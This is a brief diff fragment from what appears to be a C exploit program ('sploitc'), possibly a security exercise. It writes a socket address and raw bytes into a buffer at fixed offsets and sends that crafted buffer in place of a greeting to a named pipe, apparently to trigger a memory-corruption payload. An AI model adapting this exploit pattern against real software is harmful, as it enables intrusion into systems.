@@ -189,7 +189,7 @@ int main(void)
   strcpy(bufr + 387, sockaddr_in_addr);
   // 4 byte value 16
   strcpy(bufr + 391, "\x01\x01\x01\x01");
-  writecmd(PIPEPATH, "Hello from sploitc!");
+  writecmd(PIPEPATH, bufr);
   
   return 0;
 }
